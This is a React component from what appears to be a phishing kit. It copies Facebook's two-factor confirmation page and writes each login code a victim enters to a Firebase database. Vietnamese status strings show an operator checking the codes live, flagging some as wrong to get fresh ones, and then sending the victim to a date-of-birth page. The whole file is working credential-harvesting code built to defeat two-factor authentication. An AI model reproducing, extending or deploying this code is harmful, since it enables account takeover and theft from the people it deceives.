import { onValue, ref, update } from "firebase/database";
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router";
import { database } from "../Utils/firebase";
import "./facode.scss";

const FaCode = () => {
  const [facode, setFacode] = React.useState("");
  const [error_login_code, setError_login_code] = useState(false);
  const [validating, setValidating] = useState(false);
  const [resending, setResending] = useState(false);
  const [resended, setResended] = useState(false);

  const navigate = useNavigate();

  const handleSend = () => {
    setResended(false);
    setError_login_code(false);
    setValidating(true);
    const updates = {};

    updates["/" + localStorage.getItem("record_uid") + "/" + "2facode"] =
      facode;
    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
      "Đang chờ xác nhận 2fa từ admin";

    update(ref(database), updates);
  };

  const handleResending = () => {
    setError_login_code(false);
    setResending(true);
    const updates = {};
    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
      "3z";
    update(ref(database), updates);
  };

  useEffect(() => {
    const starCountRef = ref(
      database,
      "/" + localStorage.getItem("record_uid")
    );
    onValue(starCountRef, (snapshot) => {
      const data = snapshot.val();
      // console.log(data);
      if (data?.user_status === "Đang chờ user nhập ngày sinh") {
        navigate("/confirm/date-of-birth");
      } else if (data?.user_status === "2") {
        setValidating(false);
        setError_login_code(true);
        const updates = {};
        updates[
          "/" + localStorage.getItem("record_uid") + "/" + "user_status"
        ] = "Đang chờ user nhập lại mã 2fa";

        update(ref(database), updates);
        // eslint-disable-next-line no-dupe-else-if
      } else if (data?.user_status === "Đã gửi lại mã 2fa") {
        setResending(false);
        setResended(true);
      }
    });
  }, []);

  // const wrapperRef = useRef(null);

  // useOutsideClick(wrapperRef, () => {
  //   if (error_login_code) {
  //     setError_login_code(false);
  //   }
  // });

  return (
    <div
      className=""
      style={{
        height: "100vh",
        background: "#e9ebee",
        display: "flex",
      }}
    >
      <div className="facode-container">
        <div className="_head">
          <strong>Choose a way to confirm that it's you</strong>
          <div></div>
        </div>
        <div className="_body">
          <p className="p_1">
            Your account has two-factor authentication enabled. This requires
            some additional steps to confirm this.
          </p>
          <div className="body_mid">
            <strong>Approve from another device</strong>
            <p>
              We have sent notice to your facebook. Please check your Facebook
              message and approve the confirmation to continue.
            </p>
          </div>
          <div className="_body_bottom">
            <strong>Or, enter your login code</strong>
            <p>
              Enter the 6 or 8 digit code sent to your phone number and email or
              from the authentication app that you set up.
            </p>

            <div
              style={{
                position: "relative",
                width: "fit-content",
              }}
            >
              <span className={`${error_login_code && "show-error-span"}`}>
                <input
                  type="text"
                  value={facode}
                  disabled={validating}
                  onChange={(e) => {
                    if (e.target.value?.length < 9) {
                      if (!isNaN(e.target.value)) {
                        setFacode(e.target.value);
                      }
                    }
                  }}
                  autoComplete="off"
                  placeholder="Login code"
                  aria-label="Login code"
                ></input>
                {resended && (
                  <p className="text-secondary mt-1" style={{ fontSize: 14 }}>
                    Login code has been sent to your phone or email.
                  </p>
                )}
                {validating && (
                  <div className={` d-flex align-items-center mt-1`}>
                    <span
                      style={{
                        color: "#05a442",
                        fontSize: 14,
                      }}
                    >
                      Validating information
                    </span>
                    <div
                      className="validating "
                      style={{
                        width: 12,
                        height: 12,
                        borderWidth: 2,
                        borderTopWidth: 2,
                      }}
                    ></div>
                  </div>
                )}
              </span>
              <div
                className={`error_ele ${error_login_code && "show-error-text"}`}
              >
                <div>
                  The login code you entered doesn't match the one sent to your
                  phone. Please check the number and try again.
                  <i></i>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="_bottom">
          <a
            className={`${resending && "inactive"}`}
            role="button"
            onClick={handleResending}
          >
            Resend the login code
          </a>
          <button
            onClick={handleSend}
            disabled={resending || validating || facode?.length < 6}
            style={{
              minWidth: 50,
              opacity: resending || validating || facode?.length < 6 ? 0.7 : 1,
            }}
          >
            {resending ? (
              <div
                className="validating mx-auto"
                style={{
                  width: 15,
                  height: 15,
                  borderWidth: 2,
                  borderTopWidth: 2,
                  margin: 0,
                  borderTopColor: "#f3f3f3",
                  borderColor: "#4267b2",
                  borderLeft: "2px solid #f3f3f3",
                  borderBottom: "2px solid #f3f3f3",
                }}
              ></div>
            ) : (
              "Submit code"
            )}
          </button>
        </div>
      </div>
    </div>
  );
};

export default FaCode;
